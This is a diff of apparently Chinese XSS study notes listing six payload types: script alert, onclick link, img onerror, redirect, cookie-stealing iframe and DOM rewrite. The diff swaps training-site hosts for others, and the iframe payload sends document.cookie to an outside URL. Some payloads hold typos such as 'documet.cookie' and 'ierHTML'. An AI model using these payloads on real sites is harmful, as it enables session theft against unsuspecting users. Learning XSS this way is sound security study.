@@ -91,9 +91,9 @@
   	1- 脚本：<script>alert('xss')</script>
   	2- 超链接：<a href='' onclick=alert('xss')>click it</a>
   	3- 图片：<img src=http://172.16.1.23/a.jpgg onerror=alert('xss')>
-  	4- 重定向：<script>window.location="http://www.qytphp.com/was/xss.html"</script>
-  	5- iframe：<iframe width=300 height=100 src="http://dvwa.qytang.com/vul/xss_r/?name=<script>window.location='http://www.qytphp.com/was/cookie.php?sid='%2Bdocumet.cookie;</script>"></iframe>
-  	6- DOM：<script>document.body.ierHTML="<div style=visibility.visible;><br/><br/><h1>QYTAG</h1></div>";</script>
+  	4- 重定向：<script>window.location="http://www.testfire.net/index.jsp"</script>
+  	5- iframe：<iframe width=300 height=100 src="http://dvwa.com/xss_vul/?name=<script>window.location='http://baidu.com/login_cookie.php?sid='%2Bdocumet.cookie;</script>"></iframe>
+  	6- DOM：<script>document.body.ierHTML="<div style=visibility.visible;><br/><br/><h1>test</h1></div>";</script>
   
   # 攻击技巧
   	1- hook
